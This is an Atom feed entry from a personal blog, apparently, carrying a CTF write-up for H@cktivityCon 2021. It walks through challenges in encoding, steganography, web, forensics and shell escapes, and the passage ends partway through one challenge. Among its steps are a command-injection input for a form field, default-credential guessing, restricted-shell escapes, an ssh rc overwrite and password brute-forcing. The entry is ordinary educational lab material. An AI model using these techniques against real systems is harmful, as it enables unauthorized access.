@@ -1,0 +1,1253 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+ <title>Hacking on the Horizon</title>
+ <link href="https://h0th.lol/atom.xml" rel="self"/>
+ <link href="https://h0th.lol/"/>
+ <updated>2021-09-21T19:27:46-05:00</updated>
+ <id>https://h0th.lol</id>
+ <author>
+   <name></name>
+   <email></email>
+ </author>
+
+ 
+ <entry>
+   <title>CTF Log - H@cktivityCon 2021 CTF</title>
+   <link href="https://h0th.lol/2021/09/20/hacktivity-2021-ctf-log"/>
+   <updated>2021-09-20T00:00:00-05:00</updated>
+   <id>https://h0th.lol/2021/09/20/hacktivity-2021-ctf-log</id>
+   <content type="html">&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A log of the challenges I completed during the H@cktivityCon 2021 CTF&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;hcktivitycon-2021-ctf&quot;&gt;H@cktivityCon 2021 CTF&lt;/h1&gt;
+&lt;h2 id=&quot;warmup-challenges&quot;&gt;Warmup Challenges&lt;/h2&gt;
+&lt;h3 id=&quot;read-the-rules&quot;&gt;Read the Rules&lt;/h3&gt;
+&lt;p&gt;Challenge Author: @JohnHammond#6971&lt;/p&gt;
+
+&lt;p&gt;A flag in the source code of the rules page.&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!--     Thank you for reading the rules! Your flag is:         --&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;&amp;lt;!--        flag{90bc54705794a62015369fd8e86e557b}              --&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- You will have to wait until the CTF starts to submit this! --&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;six-four-over-two&quot;&gt;Six Four Over Two&lt;/h3&gt;
+&lt;p&gt;Challenge Author: @JohnHammond#6971&lt;/p&gt;
+
+&lt;p&gt;The challenge provided this encoded value:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EBTGYYLHPNQTINLEGRSTOMDCMZRTIMBXGY2DKMJYGVSGIOJRGE2GMOLDGBSWM7IK
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The name of the challenge and the capital letters clued me into the fact that this is a base32 encoded string.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/Documents/ctf/hacktivity]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'EBTGYYLHPNQTINLEGRSTOMDCMZRTIMBXGY2DKMJYGVSGIOJRGE2GMOLDGBSWM7IK'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base32&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
+flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a45d4e70bfc407645185dd9114f9c0ef&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;tsunami&quot;&gt;Tsunami&lt;/h3&gt;
+&lt;p&gt;Challenge Author: @JohnHammond#6971&lt;/p&gt;
+
+&lt;p&gt;The challenge provided a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tsunami&lt;/code&gt;. Using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; command on it reveals that it is a WAVE audio file.&lt;/p&gt;
+
+&lt;p&gt;I add the .wav extension to it and opened it in Audacity. After clicking on the &lt;em&gt;spectogram&lt;/em&gt; view mode, the flag is revealed.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/hacktivity2021/tsunami.png&quot; alt=&quot;Flag shown as a spectogram&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;pimple&quot;&gt;Pimple&lt;/h3&gt;
+&lt;p&gt;Challenge Author: @JohnHammond#6971&lt;/p&gt;
+
+&lt;p&gt;The challenge provided a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pimple&lt;/code&gt;. Using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; command on it reveals that it is a type of image file. I open it in Gimp and see multiple layers of pictures of random people’s faces. One of the layers has the flag in the image.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/hacktivity2021/pimple.png&quot; alt=&quot;Flag in one of the image layers&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;web&quot;&gt;Web&lt;/h2&gt;
+&lt;h3 id=&quot;swaggy&quot;&gt;Swaggy&lt;/h3&gt;
+&lt;p&gt;Challenge Author: @congon4tor#2334&lt;/p&gt;
+
+&lt;p&gt;The challenge provided Swagger documentation and an API with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/flag&lt;/code&gt; GET request endpoint.&lt;/p&gt;
+
+&lt;p&gt;As shown below, performing the GET request results in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;missing authorization header&lt;/code&gt; response.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/hacktivity2021/swaggy1.png&quot; alt=&quot;Swagger API documentation&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I initially try the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:password&lt;/code&gt; credentials, which doesn’t work. My second guess is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt; which results in the server responding with the flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/hacktivity2021/swaggy2.png&quot; alt=&quot;Request with basic auth header and flag response&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;confidentiality&quot;&gt;Confidentiality&lt;/h3&gt;
+&lt;p&gt;Challenge Author: @JohnHammond#6971&lt;/p&gt;
+
+&lt;p&gt;The challenge provided a website with a simple form field. Submitting the name of a file or directory as part of that form would return the output of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -lsa&lt;/code&gt; command using your provided input as the argument.&lt;/p&gt;
+
+&lt;p&gt;By submitting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts;cat flag.txt&lt;/code&gt;, the underlying application performs the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -lsa /etc/hosts&lt;/code&gt; command, then because of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; performs the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat flag.txt&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/hacktivity2021/confidentiality.png&quot; alt=&quot;Showing the output of the aforementioned form submission&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;forensics&quot;&gt;Forensics&lt;/h2&gt;
+&lt;h3 id=&quot;bacon-in-a-haystack&quot;&gt;Bacon in a Haystack&lt;/h3&gt;
+&lt;p&gt;Challenge Author: NightWolf#0268&lt;/p&gt;
+
+&lt;p&gt;The challenge provided a bunch of traffic logs of different protocol types. The logs are shown below.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/Documents/ctf/hacktivity/2021-09-08]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls     
+&lt;/span&gt;capture_loss.00:00:00-01:00:00.log  conn-summary.00:00:00-01:00:00.log  files.00:00:00-01:00:00.log           notice.00:00:00-01:00:00.log         reporter.03:53:19-03:53:19.log  stats.03:53:19-03:53:21.log
+capture_loss.01:00:00-02:00:00.log  conn-summary.01:00:00-02:00:00.log  files.01:00:00-02:00:00.log           notice.01:00:00-02:00:00.log         software.02:15:51-03:00:00.log  stderr.02:15:41-03:53:21.log
+capture_loss.02:16:42-03:00:00.log  conn-summary.02:00:00-02:01:50.log  files.02:00:00-02:01:50.log           notice.02:20:05-03:00:00.log         ssl.00:00:00-01:00:00.log       stdout.02:15:41-03:53:21.log
+capture_loss.03:00:00-03:53:19.log  conn-summary.02:15:56-03:00:00.log  files.02:15:51-03:00:00.log           notice.03:00:00-03:53:19.log         ssl.01:00:00-02:00:00.log       weird.00:00:00-01:00:00.log
+capture_loss.03:53:19-03:53:21.log  conn-summary.03:00:00-03:53:19.log  files.03:00:00-03:53:19.log           ocsp.00:00:00-01:00:00.log           ssl.02:00:00-02:01:50.log       weird.02:16:09-03:00:00.log
+conn.00:00:00-01:00:00.log          conn-summary.03:53:19-03:53:21.log  http.00:00:00-01:00:00.log            ocsp.01:00:00-02:00:00.log           ssl.02:15:47-03:00:00.log       weird.03:00:00-03:53:19.log
+conn.01:00:00-02:00:00.log          dns.00:00:00-01:00:00.log           http.01:00:00-02:00:00.log            ocsp.02:00:00-02:01:50.log           ssl.03:00:00-03:53:19.log       x509.00:00:00-01:00:00.log
+conn.02:00:00-02:01:50.log          dns.01:00:00-02:00:00.log           http.02:15:51-03:00:00.log            ocsp.02:16:08-03:00:00.log           stats.00:00:00-01:00:00.log     x509.01:00:00-02:00:00.log
+conn.02:15:56-03:00:00.log          dns.02:00:00-02:01:50.log           http.03:00:00-03:53:19.log            ocsp.03:00:00-03:53:19.log           stats.01:00:00-02:00:00.log     x509.02:15:48-03:00:00.log
+conn.03:00:00-03:53:19.log          dns.02:15:46-03:00:00.log           known_hosts.02:15:46-03:00:00.log     packet_filter.02:15:42-03:00:00.log  stats.02:15:42-03:00:00.log     x509.03:00:00-03:53:19.log
+conn.03:53:19-03:53:21.log          dns.03:00:00-03:53:19.log           loaded_scripts.02:15:42-03:00:00.log  reporter.00:00:00-01:00:00.log       stats.03:00:00-03:53:19.log
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I started by looking through the DNS logs and saw a bunch of requests for random domains. After manually looking through the various domains I grep through the entire directory for a couple sites like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;defcon.com&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;github.com&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The github grep returns DNS queries for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sketchysite.github.io&lt;/code&gt;. I navigate there and am greeted by the flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/hacktivity2021/bacon.png&quot; alt=&quot;Screenshot of flag at sketchysite.github.io&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;miscellaneous&quot;&gt;Miscellaneous&lt;/h2&gt;
+&lt;h3 id=&quot;bad-words&quot;&gt;Bad Words&lt;/h3&gt;
+&lt;p&gt;Challenge Author: @JohnHammond#6971&lt;/p&gt;
+
+&lt;p&gt;I connect to a listening port and am dropped in a restricted shell. The shell seems to filter a lot of common commands. I try invoking &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; to go into a new shell and it works.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/Documents/ctf/hacktivity/2021-09-08]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc challenge.ctf.games 31873
+bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+user@host:/home/user&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+id
+&lt;/span&gt;You said a bad word, &lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;
+user@host:/home/user&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/bin/bash
+/bin/bash
+&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;just
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;just
+&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;out
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;out
+&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;of
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;of
+&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;reach
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;reach
+&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;flag.txt
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
+flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;2d43e30a358d3f30fe65cc47a9cbbe98&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;race-car&quot;&gt;Race Car&lt;/h3&gt;
+&lt;p&gt;Challenge Author: @JohnHammond#6971&lt;/p&gt;
+
+&lt;p&gt;This is a neat one, somewhat remeniscent of a level on OverTheWire’s “Bandit” wargame.&lt;/p&gt;
+
+&lt;p&gt;The challenge provides me with credentials and an address to ssh to, but the connection is closed immediately upon connecting.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/Documents/ctf/hacktivity/2021-09-08]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 32532 user@challenge.ctf.games
+user@challenge.ctf.games&lt;span class=&quot;s1&quot;&gt;'s password: 
+Connection to challenge.ctf.games closed by remote host.
+Connection to challenge.ctf.games closed.
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I tried a lot of different things and read a lot of different stackoverflow articles trying to figure out what the problem was. I initially thought it was something like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exit 0&lt;/code&gt; or some kind of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pkill&lt;/code&gt; command in the user’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bashrc&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.profile&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bash_profile&lt;/code&gt;, or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.login&lt;/code&gt; file. As a result I tried a lot of different on-connect &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sed&lt;/code&gt; commands to try to remove the suspected issue from those files. That didn’t work, however.&lt;/p&gt;
+
+&lt;p&gt;Eventually I wisened up and tried connecting over &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sftp&lt;/code&gt; and was able to poke around the filesystem from there. I found a &lt;a href=&quot;https://docstore.mik.ua/orelly/networking_2ndEd/ssh/ch08_04.htm&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rc&lt;/code&gt; file&lt;/a&gt; in the user’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.ssh/&lt;/code&gt; directory with the following contents:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+pkill ssh
+&lt;span class=&quot;nb&quot;&gt;logout
+exit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;put&lt;/code&gt; to overwrite the file and was then able to ssh in with no issue. The privesc wasn’t really a privesc, I just did &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo su&lt;/code&gt; to become &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; and get the flag.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/Documents/ctf/hacktivity/2021-09-08]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 32532 user@challenge.ctf.games 
+user@challenge.ctf.games&lt;span class=&quot;s1&quot;&gt;'s password: 
+user@race-car-1744c696a30f0f35-f4fb64845-wjdhc:~$ sudo -l
+Matching Defaults entries for user on race-car-1744c696a30f0f35-f4fb64845-wjdhc:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User user may run the following commands on race-car-1744c696a30f0f35-f4fb64845-wjdhc:
+    (root) NOPASSWD: ALL
+user@race-car-1744c696a30f0f35-f4fb64845-wjdhc:~$ sudo su
+root@race-car-1744c696a30f0f35-f4fb64845-wjdhc:/home/user# cat /root/flag.txt
+flag{f3deae2684d2bbec63d088374502a339}
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;redlike&quot;&gt;Redlike&lt;/h3&gt;
+&lt;p&gt;Challenge Author: @JohnHammond#6971&lt;/p&gt;
+
+&lt;p&gt;Didn’t get any pastes or screenshots for this one. I got ssh access to a box and just needed to do the Redis privesc wherein you load a custom module that lets you execute commands as the user that Redis is running as.&lt;/p&gt;
+
+&lt;p&gt;Here’s a &lt;a href=&quot;https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#load-redis-module&quot;&gt;link&lt;/a&gt; to that privilege escalation method.&lt;/p&gt;
+
+&lt;h3 id=&quot;shelle&quot;&gt;Shelle&lt;/h3&gt;
+&lt;p&gt;Challenge Author: @fumenoid#9548&lt;/p&gt;
+
+&lt;p&gt;This is another pseudo-shell / shell-escape challenge. I connected to the server and got a shell with a limited number of commands. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; character was restricted so I couldn’t invoke &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;I was able to escape by typing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$SHELL&lt;/code&gt; which, as a common environment variable mapping to the current shell, was analogous to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;. I poked around and found the flag in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/flag.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/Documents/ctf/hacktivity/2021-09-08]                        
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc challenge.ctf.games 30414
+Welcome to Shelle, a custom psuedo shell utility created by Professor Shelle &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;order to teach students about Linux terminals                                                                 
+Shelle is a restricted environment to prevent any misuse, Please Enter &lt;span class=&quot;s1&quot;&gt;'HELP'&lt;/span&gt; to know about available features, happy learning &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
+
+root@pshelle&lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;bin/bash
+/bin/bash
+Illegal Character found, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;safety reasons only certain characters are allowed
+
+root@psuedoshell&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;SHELL
+&lt;span class=&quot;nv&quot;&gt;$SHELL&lt;/span&gt;
+bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+bash: &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
+
+shelle@shelle-cca5d5573c813293-5f5dbcd88b-zlq6s:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /opt/flag.txt
+flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;82ad133488ad326eaf2120e03253e5d7&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;scripting&quot;&gt;Scripting&lt;/h2&gt;
+&lt;h3 id=&quot;uhaha&quot;&gt;UHAHA&lt;/h3&gt;
+&lt;p&gt;Challenge Author: &lt;em&gt;@JohnHammond#6971&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;They gave me a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uhaha&lt;/code&gt;. By running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; on it I learned that it was an Uharc archive file, which is an old compression algorithm.&lt;/p&gt;
+
+&lt;p&gt;The CLI tool for decompressing .uha files is only for Windows, but I’m able to run it on Kali using Wine. I make a bash for loop to throw the top 100 passwords from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; at it and am greeted by another filed named uhaha, which, as you would guess, is another Uharc compressed archive.&lt;/p&gt;
+
+&lt;p&gt;I used the following bash script to keep bruteforcing the decompression of Uharc archives as I suspect it’s like a bajillion files deep.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1..10000&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do
+	for &lt;/span&gt;ii &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 101 /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do
+		&lt;/span&gt;wine UHARC.EXE x &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pw&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ii&lt;/span&gt; target.uha&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;uhaha&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;then
+			&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;uhaha target.uha
+			&lt;span class=&quot;nb&quot;&gt;break
+		&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fi
+	done
+done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Eventually I get a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.png&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/hacktivity2021/uhaha.png&quot; alt=&quot;image of flag&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I couldn’t stop thinking about &lt;a href=&quot;https://www.youtube.com/watch?v=GY8EDRsRhik&quot;&gt;this scene&lt;/a&gt; from Finding Nemo while doing this challenge. &lt;em&gt;Sharkbait, Ooh Ha Ha!&lt;/em&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;movie-marathon&quot;&gt;Movie Marathon&lt;/h3&gt;
+&lt;p&gt;Challenge Author: @Blacknote#1337&lt;/p&gt;
+
+&lt;p&gt;I didn’t actually finish this one because the IMDB API went down and I was too lazy to find another one (also they flagged my account). But basically you connect to a port and it gives you a movie and its release date and you have to respond with 5 actors that starred in that movie.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/Documents/ctf/hacktivity/uha]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc challenge.ctf.games 30016
+    __  ___           _         __  ___                 __  __              
+   /  |/  /___ _   __&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;__     /  |/  /___ __________ _/ /_/ /_  ____  ____ 
+  / /|_/ / __ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| / / / _ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;  / /|_/ / __ &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;/ ___/ __ &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;/ __/ __ &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; __ &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; __ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+ / /  / / /_/ / |/ / /  __/  / /  / / /_/ / /  / /_/ / /_/ / / / /_/ / / / /
+/_/  /_/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;___/|___/_/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__/  /_/  /_/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_,_/_/   &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_,_/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_/_/ /_/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;___/_/ /_/ 
+                                                                            
+You think you know movies more than I &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;? If you can send me any 5 cast members &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each movie that I mention, I&lt;span class=&quot;s1&quot;&gt;'ll reward you.
+e.g. The Avengers (2012-04-25)
+Chris Evans; Robert Downey Jr.; Mark Ruffalo; Chris Hemsworth; Scarlett Johansson
+
+
